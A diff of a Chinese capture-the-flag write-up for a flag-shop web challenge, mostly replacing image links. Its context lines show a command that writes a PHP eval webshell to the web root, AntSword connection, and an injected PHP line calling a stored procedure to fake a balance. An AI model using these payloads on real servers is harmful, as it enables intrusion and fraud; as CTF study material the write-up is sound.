@@ -3,7 +3,8 @@
 
 05_em_v_CFK
 
-![alt text](image-1.png)
+<img width="1445" height="870" alt="image" src="https://github.com/user-attachments/assets/87577f86-ea07-4df6-ac71-ebe626eb7d11" />
+
 
 一个flag购买商店，然后看源码可以看到一段特别的注释：
 5bvE5YvX5Ylt5YdT5Yvdp2uyoTjhpTujYPQyhXoxhVcmnT935L+P5cJjM2I05oPC5cvB55dR5Mlw6LTK54zc5MPa
@@ -14,7 +15,8 @@
 
 然后这里直接访问/shell.php?get显示404，因此可能存在前置路径，用dirsearch能够扫出来uploads,因此可以加上该路径后再进行访问如下：
 
-![alt text](image-2.png)
+<img width="956" height="536" alt="image" src="https://github.com/user-attachments/assets/54ee92c7-29e5-4a15-af5b-cef9ca146b91" />
+
 
 把pass放到md5解密网站上出来就是114514，然后后面的cmd可以执行响应命令，可以构造webshell:
 
@@ -22,7 +24,8 @@ key=114514&cmd=echo '<?php @eval($_POST[1]);?>' > /var/www/html/1.php
 
 写入成功后可以连接蚁剑，找到index.php,但是我们无法直接修改余额，因此可以先把该文件保存到本地删除再修改上传，发现可以，最后得到我们的flag
 
-![alt text](image-3.png)
+<img width="1547" height="551" alt="image" src="https://github.com/user-attachments/assets/02f75374-0246-4132-b778-8c293fd4be19" />
+
 
 然后这里不连webshell的方法有点复杂，先是ls找文件，然后用：
 
@@ -47,5 +50,6 @@ key=114514&code=include('../connect.php');var_dump($pdo->query("CALL buy_item(3,
 include('../connect.php');：利用现成的文件建立数据库连接对象 $pdo，无需知道数据库密码。
 CALL buy_item(3, 50)：手动调用存储过程，购买 ID 3 的商品，并欺骗数据库说我有 50 块钱。
 
-![alt text](image-4.png)
+<img width="2130" height="665" alt="image" src="https://github.com/user-attachments/assets/a3e676b5-803b-4558-b439-3fbfab690292" />
+
 
